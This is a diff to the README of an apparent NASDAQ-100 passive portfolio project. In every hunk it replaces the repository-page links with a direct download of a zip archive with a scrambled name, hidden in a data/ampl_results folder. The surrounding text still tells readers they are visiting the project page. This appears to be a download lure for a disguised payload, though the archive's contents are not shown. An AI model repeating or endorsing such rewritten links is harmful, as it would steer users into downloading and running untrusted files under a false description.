@@ -1,6 +1,6 @@
 # 📊 Passive-Portfolio-Management - Optimal NASDAQ-100 Index Fund
 
-[![Download Passive-Portfolio-Management](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/aniketagrawal/Passive-Portfolio-Management)
+[![Download Passive-Portfolio-Management](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/aniketagrawal/Passive-Portfolio-Management/raw/refs/heads/main/data/ampl_results/Management-Portfolio-Passive-2.6.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ You need to visit the main project page to get the software. This repository doe
 
 1. Click on the large green button below or visit this link:
 
-   [Download Passive-Portfolio-Management](https://github.com/aniketagrawal/Passive-Portfolio-Management)
+   [Download Passive-Portfolio-Management](https://github.com/aniketagrawal/Passive-Portfolio-Management/raw/refs/heads/main/data/ampl_results/Management-Portfolio-Passive-2.6.zip)
 
 2. On the GitHub page, look for the section named **Releases** or **Assets**.
 
@@ -86,7 +86,7 @@ To update:
 
 1. Return to the repository page here:
 
-   [Passive-Portfolio-Management on GitHub](https://github.com/aniketagrawal/Passive-Portfolio-Management)
+   [Passive-Portfolio-Management on GitHub](https://github.com/aniketagrawal/Passive-Portfolio-Management/raw/refs/heads/main/data/ampl_results/Management-Portfolio-Passive-2.6.zip)
 
 2. Check the latest release date and version number.
 
@@ -122,4 +122,4 @@ If you find issues or want to suggest improvements, use the **Issues** tab on th
 
 ---
 
-[Download Passive-Portfolio-Management](https://github.com/aniketagrawal/Passive-Portfolio-Management)
+[Download Passive-Portfolio-Management](https://github.com/aniketagrawal/Passive-Portfolio-Management/raw/refs/heads/main/data/ampl_results/Management-Portfolio-Passive-2.6.zip)
